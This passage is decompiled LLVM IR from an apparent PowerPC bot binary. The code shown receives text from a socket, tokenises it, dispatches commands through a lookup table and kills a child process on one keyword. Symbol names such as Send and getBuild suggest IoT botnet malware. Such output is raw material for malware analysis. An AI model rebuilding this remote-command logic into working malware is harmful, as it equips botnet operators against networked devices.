  %v1_10012aa483 = phi i32 [ %v1_10012aa4, %dec_label_pc_10012ab0 ], [ %.pre, %dec_label_pc_10012af8.preheader ]
  %v1_10012ac8 = add i32 %v2_10012ac486, -4
  store i32 %v1_10012ac8, i32* @r10, align 4
  %v1_10012ae4 = inttoptr i32 %v2_10012ac486 to i32*
  %v2_10012ae4 = load i32, i32* %v1_10012ae4, align 4
  %v2_10012ae8 = inttoptr i32 %v1_10012ac8 to i32*
  store i32 %v2_10012ae4, i32* %v2_10012ae8, align 4
  %v1_10012aa4 = add i32 %v1_10012aa483, 1
  %v3_10012afc = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10012b04 = icmp ult i32 %v1_10012aa4, %v3_10012afc
  %v1_10012ab4 = mul i32 %v1_10012aa4, 4
  %v3_10012ac0 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_10012ac4 = add i32 %v3_10012ac0, %v1_10012ab4
  br i1 %v2_10012b04, label %dec_label_pc_10012ab0, label %dec_label_pc_10012b0c

dec_label_pc_10012b0c:                            ; preds = %dec_label_pc_10012ab0, %dec_label_pc_10012af8.preheader
  %v2_10012ac4.lcssa = phi i32 [ %v2_10012ac482, %dec_label_pc_10012af8.preheader ], [ %v2_10012ac4, %dec_label_pc_10012ab0 ]
  %v1_10012b24 = add i32 %v2_10012ac4.lcssa, -4
  %v2_10012b2c = inttoptr i32 %v1_10012b24 to i32*
  store i32 0, i32* %v2_10012b2c, align 4
  %v3_10012b34 = load i32, i32* @global_var_1004517c.27, align 4
  %v1_10012b38 = add i32 %v3_10012b34, -1
  store i32 %v1_10012b38, i32* @global_var_1004517c.27, align 4
  %v1_10012b4c = mul i32 %v1_10012b38, 4
  %v1_10012b50 = add i32 %v1_10012b4c, 4
  store i32 %v1_10012b50, i32* @r3, align 4
  store i32 268512092, i32* @lr, align 4
  %v0_10012b58 = call i32 @malloc()
  %v3_10012bb424 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10012bbc25 = icmp eq i32 %v3_10012bb424, 0
  br i1 %v2_10012bbc25, label %dec_label_pc_10012bc4, label %dec_label_pc_10012b70

dec_label_pc_10012b70:                            ; preds = %dec_label_pc_10012b0c, %dec_label_pc_10012b70
  %storemerge2027 = phi i32 [ %v1_10012ba8, %dec_label_pc_10012b70 ], [ 0, %dec_label_pc_10012b0c ]
  %v1_10012b74 = mul i32 %storemerge2027, 4
  %v2_10012b80 = add i32 %v1_10012b74, %v0_10012b58
  store i32 %v2_10012b80, i32* @r10, align 4
  %v3_10012b94 = load i32, i32* @global_var_100451cc.28, align 4
  %v2_10012b98 = add i32 %v3_10012b94, %v1_10012b74
  %v1_10012b9c = inttoptr i32 %v2_10012b98 to i32*
  %v2_10012b9c = load i32, i32* %v1_10012b9c, align 4
  %v2_10012ba0 = inttoptr i32 %v2_10012b80 to i32*
  store i32 %v2_10012b9c, i32* %v2_10012ba0, align 4
  %v1_10012ba8 = add i32 %storemerge2027, 1
  %v3_10012bb4 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10012bbc = icmp ult i32 %v1_10012ba8, %v3_10012bb4
  br i1 %v2_10012bbc, label %dec_label_pc_10012b70, label %dec_label_pc_10012bb0.dec_label_pc_10012bc4_crit_edge

dec_label_pc_10012bb0.dec_label_pc_10012bc4_crit_edge: ; preds = %dec_label_pc_10012b70
  br label %dec_label_pc_10012bc4

dec_label_pc_10012bc4:                            ; preds = %dec_label_pc_10012b0c, %dec_label_pc_10012bb0.dec_label_pc_10012bc4_crit_edge
  %v3_10012bc8 = load i32, i32* @global_var_100451cc.28, align 4
  store i32 %v3_10012bc8, i32* @r3, align 4
  store i32 268512212, i32* @lr, align 4
  %v0_10012bd0 = call i32 @free()
  store i32 %v0_10012b58, i32* @global_var_100451cc.28, align 4
  br label %dec_label_pc_10012be0

dec_label_pc_10012be0:                            ; preds = %dec_label_pc_10012a68, %dec_label_pc_10012bc4
  %v3_10012bf0 = load i32, i32* @global_var_1004517c.27, align 4
  %v2_10012bf8 = icmp ult i32 %.pre, %v3_10012bf0
  br i1 %v2_10012bf8, label %dec_label_pc_10012a68, label %dec_label_pc_10012c00

dec_label_pc_10012c00:                            ; preds = %dec_label_pc_10012bec.preheader, %dec_label_pc_10012be0
  %v3_10012c04 = load i32, i32* @global_var_1004519c.24, align 4
  %v1_10012c08 = udiv i32 %v3_10012c04, 32
  %v1_10012c0c = mul nuw nsw i32 %v1_10012c08, 4
  %v1_10012c18 = add i32 %v1_10012c0c, %v2_100129dc
  %v1_10012c1c = inttoptr i32 %v1_10012c18 to i32*
  %v2_10012c1c = load i32, i32* %v1_10012c1c, align 4
  %v1_10012c28 = urem i32 %v3_10012c04, 32
  %v3_10012c2c = sub i32 0, %v3_10012c04
  %v4_10012c2c = urem i32 %v3_10012c2c, 32
  %v5_10012c2c = shl i32 %v2_10012c1c, %v4_10012c2c
  %v6_10012c2c = xor i32 %v4_10012c2c, 31
  %v7_10012c2c = lshr i32 %v2_10012c1c, %v6_10012c2c
  %v8_10012c2c = udiv i32 %v7_10012c2c, 2
  %v9_10012c2c = or i32 %v8_10012c2c, %v5_10012c2c
  %v12_10012c2c = lshr i32 -1, %v1_10012c28
  %tmp = icmp slt i32 %v2_10012c1c, 0
  %v15_10012c2c21 = zext i1 %tmp to i32
  %v16_10012c2c = xor i32 %v12_10012c2c, 1
  %v17_10012c2c = and i32 %v15_10012c2c21, %v16_10012c2c
  %v14_10012c2c = urem i32 %v12_10012c2c, 2
  %v14_10012c2c.masked = and i32 %v14_10012c2c, %v9_10012c2c
  %v1_10012c34 = or i32 %v14_10012c2c.masked, %v17_10012c2c
  %v3_10012c38 = icmp eq i32 %v1_10012c34, 0
  br i1 %v3_10012c38, label %dec_label_pc_10012980, label %dec_label_pc_10012c40

dec_label_pc_10012c40:                            ; preds = %dec_label_pc_10012c00
  store i32 268512352, i32* @lr, align 4
  %v4_10012c5c = call i32 @recv(i32 %v3_10012c04, i32 %v2_10012c48, i32 4096, i32 0)
  store i32 %v4_10012c5c, i32* %stack_var_-6616, align 4
  %tmp76 = icmp slt i32 %v4_10012c5c, 1
  br i1 %tmp76, label %dec_label_pc_10012924, label %dec_label_pc_10012c74

dec_label_pc_10012c74:                            ; preds = %dec_label_pc_10012c40
  %v3_10012c84 = add i32 %v2_10012c7c, %v4_10012c5c
  %v4_10012c84 = inttoptr i32 %v3_10012c84 to i8*
  store i8 0, i8* %v4_10012c84, align 1
  store i32 ptrtoint (i32* @global_var_1002e0ac.958 to i32), i32* @r4, align 4
  store i32 268512412, i32* @lr, align 4
  %v4_10012c98 = call i32 @__GI_strtok(i32 %v2_10012c48, i32 ptrtoint (i32* @global_var_1002e0ac.958 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10012f4845 = icmp eq i32 %v4_10012c98, 0
  br i1 %v3_10012f4845, label %dec_label_pc_10012980, label %dec_label_pc_10012f50

dec_label_pc_10012ca8:                            ; preds = %dec_label_pc_10012f50
  store i32 268512432, i32* @lr, align 4
  %v4_10012cac = call i32 @filter(i32 %storemerge47.in, i32 %storemerge47.in)
  %v2_10012cb4 = load i8, i8* %storemerge47, align 1
  %v3_10012cbc = icmp eq i8 %v2_10012cb4, 58
  br i1 %v3_10012cbc, label %dec_label_pc_10012cdc.preheader, label %dec_label_pc_10012d68

dec_label_pc_10012cdc.preheader:                  ; preds = %dec_label_pc_10012ca8
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012ce432 = call i32 @__GI_strlen()
  %v2_10012cec34 = icmp eq i32 %v0_10012ce432, 0
  br i1 %v2_10012cec34, label %dec_label_pc_10012d14, label %dec_label_pc_10012cf4

dec_label_pc_10012cd0:                            ; preds = %dec_label_pc_10012cf4
  %v1_10012cd4 = add i32 %v3_10012cf4, 1
  store i32 %v1_10012cd4, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012ce4 = call i32 @__GI_strlen()
  %v2_10012cec = icmp ult i32 %v1_10012cd4, %v0_10012ce4
  br i1 %v2_10012cec, label %dec_label_pc_10012cf4, label %dec_label_pc_10012d14

dec_label_pc_10012cf4:                            ; preds = %dec_label_pc_10012cdc.preheader, %dec_label_pc_10012cd0
  %v3_10012cf4 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012d00 = add i32 %v3_10012cf4, %storemerge47.in
  %v1_10012d04 = inttoptr i32 %v2_10012d00 to i8*
  %v2_10012d04 = load i8, i8* %v1_10012d04, align 1
  %v3_10012d0c = icmp eq i8 %v2_10012d04, 32
  br i1 %v3_10012d0c, label %dec_label_pc_10012d14, label %dec_label_pc_10012cd0

dec_label_pc_10012d14:                            ; preds = %dec_label_pc_10012cdc.preheader, %dec_label_pc_10012cd0, %dec_label_pc_10012cf4
  %v3_10012d14 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012d20 = add i32 %v3_10012d14, %storemerge47.in
  %v3_10012d28 = inttoptr i32 %v2_10012d20 to i8*
  store i8 0, i8* %v3_10012d28, align 1
  %v1_10012d30 = add i32 %storemerge47.in, 1
  %v2_10012d40 = inttoptr i32 %v1_10012d30 to i8*
  %v3_10012d40 = call i32 @strcpy(i32 %v2_10012d34, i8* %v2_10012d40)
  %v3_10012d44 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012d50 = add i32 %v3_10012d44, %storemerge47.in
  %v1_10012d54 = add i32 %v2_10012d50, 1
  %v3_10012d60 = inttoptr i32 %v1_10012d54 to i8*
  %v4_10012d60 = call i32 @strcpy(i32 %storemerge47.in, i8* %v3_10012d60)
  br label %dec_label_pc_10012d8c.preheader

dec_label_pc_10012d68:                            ; preds = %dec_label_pc_10012ca8
  store i32 10752, i32* %stack_var_-5156, align 4
  br label %dec_label_pc_10012d8c.preheader

dec_label_pc_10012d8c.preheader:                  ; preds = %dec_label_pc_10012d14, %dec_label_pc_10012d68
  store i32 0, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012d9437 = call i32 @__GI_strlen()
  %v2_10012d9c39 = icmp eq i32 %v0_10012d9437, 0
  br i1 %v2_10012d9c39, label %dec_label_pc_10012dc4, label %dec_label_pc_10012da4

dec_label_pc_10012d80:                            ; preds = %dec_label_pc_10012da4
  %v1_10012d84 = add i32 %v3_10012da4, 1
  store i32 %v1_10012d84, i32* %stack_var_-6616, align 4
  store i32 %storemerge47.in, i32* @r3, align 4
  %v0_10012d94 = call i32 @__GI_strlen()
  %v2_10012d9c = icmp ult i32 %v1_10012d84, %v0_10012d94
  br i1 %v2_10012d9c, label %dec_label_pc_10012da4, label %dec_label_pc_10012dc4

dec_label_pc_10012da4:                            ; preds = %dec_label_pc_10012d8c.preheader, %dec_label_pc_10012d80
  %v3_10012da4 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012db0 = add i32 %v3_10012da4, %storemerge47.in
  %v1_10012db4 = inttoptr i32 %v2_10012db0 to i8*
  %v2_10012db4 = load i8, i8* %v1_10012db4, align 1
  %v3_10012dbc = icmp eq i8 %v2_10012db4, 32
  br i1 %v3_10012dbc, label %dec_label_pc_10012dc4, label %dec_label_pc_10012d80

dec_label_pc_10012dc4:                            ; preds = %dec_label_pc_10012d8c.preheader, %dec_label_pc_10012d80, %dec_label_pc_10012da4
  %v3_10012dc4 = load i32, i32* %stack_var_-6616, align 4
  %v2_10012dd0 = add i32 %v3_10012dc4, %storemerge47.in
  %v3_10012dd8 = inttoptr i32 %v2_10012dd0 to i8*
  store i8 0, i8* %v3_10012dd8, align 1
  %v4_10012de8 = call i32 @strcpy(i32 %v2_10012ddc, i8* %storemerge47)
  %v3_10012dec = load i32, i32* %stack_var_-6616, align 4
  %v2_10012df8 = add i32 %v3_10012dec, %storemerge47.in
  %v1_10012dfc = add i32 %v2_10012df8, 1
  %v3_10012e08 = inttoptr i32 %v1_10012dfc to i8*
  %v4_10012e08 = call i32 @strcpy(i32 %storemerge47.in, i8* %v3_10012e08)
  store i32 0, i32* %stack_var_-6616, align 4
  %v2_10012ea889 = load i32, i32* bitcast ([4 x i8]** @global_var_1004088c.962 to i32*), align 4
  %v3_10012eac92 = icmp eq i32 %v2_10012ea889, 0
  br i1 %v3_10012eac92, label %dec_label_pc_10012eb4, label %dec_label_pc_10012e18

dec_label_pc_10012e18:                            ; preds = %dec_label_pc_10012dc4, %dec_label_pc_10012e18
  %v1_10012ea895 = phi i32* [ %v1_10012ea8, %dec_label_pc_10012e18 ], [ bitcast ([4 x i8]** @global_var_1004088c.962 to i32*), %dec_label_pc_10012dc4 ]
  %v2_10012e2c = load i32, i32* %v1_10012ea895, align 4
  store i32 %v2_10012e2c, i32* @r3, align 4
  store i32 %v2_10012ddc, i32* @r4, align 4
  %v2_10012e3c = call i32 @__GI_strcasecmp(i32 %v2_10012e2c, i32 %v2_10012ddc)
  %v3_10012e4c = load i32, i32* %stack_var_-6616, align 4
  %v1_10012e58 = mul i32 %v3_10012e4c, 8
  %v1_10012e60 = add i32 %v1_10012e58, add (i32 ptrtoint ([4 x i8]** @global_var_1004088c.962 to i32), i32 4)
  %v1_10012e64 = inttoptr i32 %v1_10012e60 to i32*
  %v2_10012e64 = load i32, i32* %v1_10012e64, align 4
  call void @__pseudo_call(i32 %v2_10012e64)
  %v3_10012e88 = load i32, i32* %stack_var_-6616, align 4
  %v1_10012e8c = add i32 %v3_10012e88, 1
  store i32 %v1_10012e8c, i32* %stack_var_-6616, align 4
  %v1_10012ea0 = mul i32 %v1_10012e8c, 8
  %v2_10012ea4 = add i32 %v1_10012ea0, ptrtoint ([4 x i8]** @global_var_1004088c.962 to i32)
  %v1_10012ea8 = inttoptr i32 %v2_10012ea4 to i32*
  %v2_10012ea8 = load i32, i32* %v1_10012ea8, align 4
  %v3_10012eac = icmp eq i32 %v2_10012ea8, 0
  br i1 %v3_10012eac, label %dec_label_pc_10012eb4, label %dec_label_pc_10012e18

dec_label_pc_10012eb4:                            ; preds = %dec_label_pc_10012e18, %dec_label_pc_10012dc4
  store i32 %v2_10012ddc, i32* @r3, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1002e0b0.963 to i32), i32* @r4, align 4
  %v3_10012ec4 = call i32 @__GI_strcasecmp(i32 %v2_10012ddc, i32 ptrtoint ([6 x i8]* @global_var_1002e0b0.963 to i32))
  %v3_10012ecc = icmp eq i32 %v3_10012ec4, 0
  br i1 %v3_10012ecc, label %dec_label_pc_10012ed4, label %dec_label_pc_10012f2c

dec_label_pc_10012ed4:                            ; preds = %dec_label_pc_10012eb4
  %v3_10012ed8 = load i32, i32* @global_var_10045168.572, align 4
  %v3_10012edc = icmp eq i32 %v3_10012ed8, 0
  br i1 %v3_10012edc, label %dec_label_pc_10012f10, label %dec_label_pc_10012ee4

dec_label_pc_10012ee4:                            ; preds = %dec_label_pc_10012ed4
  store i32 268513016, i32* @lr, align 4
  %v2_10012ef4 = call i32 @kill(i32 %v3_10012ed8, i32 9)
  %v3_10012efc = icmp eq i32 %v2_10012ef4, 0
  br i1 %v3_10012efc, label %dec_label_pc_10012f04, label %dec_label_pc_10012f10

dec_label_pc_10012f04:                            ; preds = %dec_label_pc_10012ee4
  store i32 0, i32* @global_var_10045168.572, align 4
  br label %dec_label_pc_10012f10

dec_label_pc_10012f10:                            ; preds = %dec_label_pc_10012ee4, %dec_label_pc_10012ed4, %dec_label_pc_10012f04
  %v3_10012f14 = load i32, i32* @global_var_1004519c.24, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10012f20.964 to i32), i32* @lr, align 4
  %v1_10012f1c = call i32 @close(i32 %v3_10012f14)
  store i32 268513064, i32* @lr, align 4
  %v1_10012f24 = call i32 @sleep(i32 5)
  br label %dec_label_pc_10012924

dec_label_pc_10012f2c:                            ; preds = %dec_label_pc_10012eb4
  store i32 ptrtoint (i32* @global_var_1002e0ac.958 to i32), i32* @r4, align 4
  store i32 268513084, i32* @lr, align 4
  %v4_10012f38 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002e0ac.958 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_10012f48 = icmp eq i32 %v4_10012f38, 0
  br i1 %v3_10012f48, label %dec_label_pc_10012980, label %dec_label_pc_10012f50

dec_label_pc_10012f50:                            ; preds = %dec_label_pc_10012c74, %dec_label_pc_10012f2c
  %storemerge47.in = phi i32 [ %v4_10012f38, %dec_label_pc_10012f2c ], [ %v4_10012c98, %dec_label_pc_10012c74 ]
  %storemerge47 = inttoptr i32 %storemerge47.in to i8*
  %v3_10012f54 = load i8, i8* %storemerge47, align 1
  %v3_10012f5c = icmp eq i8 %v3_10012f54, 0
  br i1 %v3_10012f5c, label %dec_label_pc_10012980, label %dec_label_pc_10012ca8

dec_label_pc_10012f68:                            ; preds = %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %storemerge47, { 2, 1, 0 }
  uselistorder i32 %storemerge47.in, { 15, 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10012ea8, { 1, 0 }
  uselistorder i32 %v4_10012c2c, { 1, 0 }
  uselistorder i32 %v2_10012c1c, { 0, 2, 1 }
  uselistorder i32 %v3_10012c04, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10012ba8, { 1, 0 }
  uselistorder i32 %v1_10012b74, { 1, 0 }
  uselistorder i32 %storemerge2027, { 1, 0 }
  uselistorder i32 %v0_10012b58, { 1, 0 }
  uselistorder i32 %v1_10012aa4, { 0, 2, 1 }
  uselistorder i32 %v2_10012ac486, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1331, { 1, 0 }
  uselistorder i32 %v3_100129c8, { 1, 0 }
  uselistorder i32 %storemerge1223, { 1, 0 }
  uselistorder i32 %v2_10012ddc, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_10012980, { 1, 0 }
  uselistorder i32 %v1_10012844, { 1, 0 }
  uselistorder i32 %v2_10012808, { 1, 0 }
  uselistorder i32 %storemerge1151, { 1, 0 }
  uselistorder i8*** %stack_var_-20, { 2, 0, 1 }
  uselistorder i32* %stack_var_-6616, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 (i32)* @sleep, { 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @close, { 25, 24, 23, 22, 21, 20, 19, 18, 6, 5, 4, 3, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 0 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1004088c.962 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_1004088c.962, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__GI_strtok, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e0ac.958 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @recv, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_100451cc.28, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* @global_var_1004517c.27, { 6, 7, 2, 8, 9, 10, 0, 1, 11, 3, 12, 4, 13, 14, 15, 5, 16, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 4, 3, 2, 1, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @Send, { 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 33, 32, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 2, 1, 0, 38, 37, 36, 35, 34, 4, 3, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32 (i32)* @getBuild, { 1, 0 }
  uselistorder i32 (i32)* @randstring, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @realrand, { 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_time, { 63, 62, 61, 0, 60, 59, 58, 57, 56, 1, 55, 54, 2, 53, 52, 3, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 8, 7, 6, 4, 5, 16, 15, 14, 13, 12, 11, 10, 9 }
  uselistorder i32 %argc, { 1, 0 }
  uselistorder label %dec_label_pc_10012f50, { 1, 0 }
  uselistorder label %dec_label_pc_10012f10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10012e18, { 1, 0 }
  uselistorder label %dec_label_pc_10012dc4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012da4, { 1, 0 }
  uselistorder label %dec_label_pc_10012d8c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10012d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10012c00, { 1, 0 }
  uselistorder label %dec_label_pc_10012be0, { 1, 0 }
  uselistorder label %dec_label_pc_10012bc4, { 1, 0 }
  uselistorder label %dec_label_pc_10012b70, { 1, 0 }
  uselistorder label %dec_label_pc_10012ab0, { 1, 0 }
  uselistorder label %dec_label_pc_10012a68, { 1, 0 }
  uselistorder label %dec_label_pc_10012994, { 1, 0 }
  uselistorder label %dec_label_pc_10012980, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100127f4, { 1, 0 }
}

define i32 @__h_errno_location(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10012f84 = load i32, i32* @r2, align 4
  %v1_10012f84 = add i32 %v0_10012f84, 76
  %v2_10012f84 = inttoptr i32 %v1_10012f84 to i32*
  %v3_10012f84 = load i32, i32* %v2_10012f84, align 4
  ret i32 %v3_10012f84
}

define i32 @__errno_location() local_unnamed_addr {
entry:
  %v0_10012f8c = load i32, i32* @r2, align 4
  %v1_10012f8c = add i32 %v0_10012f8c, 68
  %v2_10012f8c = inttoptr i32 %v1_10012f8c to i32*
  %v3_10012f8c = load i32, i32* %v2_10012f8c, align 4
  ret i32 %v3_10012f8c
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v3_10012f94 = icmp eq i32 %arg1, 0
  %v0_10012f98 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10012f94, i32 %v0_10012f98)
  %v3_10012f9c = icmp eq i32 %arg3, 0
  br i1 %v3_10012f9c, label %dec_label_pc_10012fb8, label %dec_label_pc_10012fac.preheader

dec_label_pc_10012fac.preheader:                  ; preds = %entry
  call void @llvm.trap()
  unreachable

dec_label_pc_10012fb8:                            ; preds = %entry
  store i32 %arg1, i32* %arg2, align 4
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %storemerge1 = load i32, i32* @r3, align 4
  store i32 %storemerge1, i32* %r31.global-to-local, align 4
  %v3_10012ff44 = icmp eq i32 %storemerge1, 0
  br i1 %v3_10012ff44, label %dec_label_pc_10012ffc, label %dec_label_pc_10012fe4

dec_label_pc_10012fe4:                            ; preds = %entry, %dec_label_pc_10012fe4
  %v0_10012fe4 = phi i32 [ %storemerge, %dec_label_pc_10012fe4 ], [ %storemerge1, %entry ]
  %v1_10012fe4 = inttoptr i32 %v0_10012fe4 to i32*
  %v2_10012fe4 = load i32, i32* %v1_10012fe4, align 4
  call void @__pseudo_call(i32 %v2_10012fe4)
  %v0_10012ff0 = load i32, i32* %r31.global-to-local, align 4
  %v1_10012ff0 = add i32 %v0_10012ff0, 4
  %v2_10012ff0 = inttoptr i32 %v1_10012ff0 to i32*
  %storemerge = load i32, i32* %v2_10012ff0, align 4
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  %v3_10012ff4 = icmp eq i32 %storemerge, 0
  br i1 %v3_10012ff4, label %dec_label_pc_10012ff4.dec_label_pc_10012ffc_crit_edge, label %dec_label_pc_10012fe4

dec_label_pc_10012ff4.dec_label_pc_10012ffc_crit_edge: ; preds = %dec_label_pc_10012fe4
  %v0_1001300c.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10012ffc

dec_label_pc_10012ffc:                            ; preds = %dec_label_pc_10012ff4.dec_label_pc_10012ffc_crit_edge, %entry
  %v0_1001300c = phi i32 [ %v0_1001300c.pre, %dec_label_pc_10012ff4.dec_label_pc_10012ffc_crit_edge ], [ 0, %entry ]
  ret i32 %v0_1001300c

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32* %r31.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10012fe4, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %stack_var_-56 = alloca i32, align 4
  %v0_1001301c = call i32 @__asm_mfcr()
  store i32 ptrtoint (i32* @global_var_100496d4.965 to i32), i32* @r27, align 4
  store i32 268513336, i32* @lr, align 4
  %v1_10013034 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_100496d4.965 to i32))
  %v3_1001303c = load i32, i32* @global_var_100451d0.966, align 4
  store i32 %v3_1001303c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10013054.969 to i32), i32* @lr, align 4
  %v0_10013050 = call i32 @pthread_call_handlers()
  store i32 268513368, i32* @lr, align 4
  %v1_10013054 = call i32 @__pthread_once_fork_prepare(i32 %v0_10013050)
  store i32 ptrtoint (i32* @global_var_1004ee40.970 to i32), i32* @r28, align 4
  store i32 268513384, i32* @lr, align 4
  %v1_10013064 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004ee40.970 to i32))
  store i32 ptrtoint (i32* @global_var_1004da34.971 to i32), i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10013078.972 to i32), i32* @lr, align 4
  %v1_10013074 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1004da34.971 to i32))
  store i32 268513404, i32* @lr, align 4
  %v1_10013078 = call i32 @__libc_fork(i32 %v1_10013074)
  store i32 %v1_10013078, i32* @r26, align 4
  %v3_10013080 = icmp eq i32 %v1_10013078, 0
  store i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26500), i32* @r9, align 4
  store i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26500), i32 0), i1* %cr4_eq.global-to-local, align 1
  %v0_1001308c = load i32, i32* @r30, align 4
  store i32 %v0_1001308c, i32* @r3, align 4
  br i1 %v3_10013080, label %dec_label_pc_10013094, label %dec_label_pc_10013114

dec_label_pc_10013094:                            ; preds = %entry
  %v2_10013094 = ptrtoint i32* %stack_var_-56 to i32
  br i1 icmp eq (i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26500), i32 0), label %dec_label_pc_100130c8, label %dec_label_pc_100130a4

dec_label_pc_100130a4:                            ; preds = %dec_label_pc_10013094
  %v2_100130a4 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_100130b0 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_100130b4 = load i32, i32* @r30, align 4
  %v3_100130bc = call i32 @pthread_mutex_init(i32 %v0_100130b4, i32* nonnull %stack_var_-56)
  %v1_100130c4 = call i32 @pthread_mutexattr_destroy(i32 %v2_10013094)
  br label %dec_label_pc_100130c8

dec_label_pc_100130c8:                            ; preds = %dec_label_pc_10013094, %dec_label_pc_100130a4
  %v0_100130c8 = load i32, i32* @r28, align 4
  %v3_100130d0 = call i32 @pthread_mutex_init(i32 %v0_100130c8, i32* null)
  %v0_100130d8 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100130d8, label %dec_label_pc_10013100, label %dec_label_pc_100130dc

dec_label_pc_100130dc:                            ; preds = %dec_label_pc_100130c8
  %v2_100130dc = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-56)
  %v3_100130e8 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-56, i32 0)
  %v0_100130ec = load i32, i32* @r27, align 4
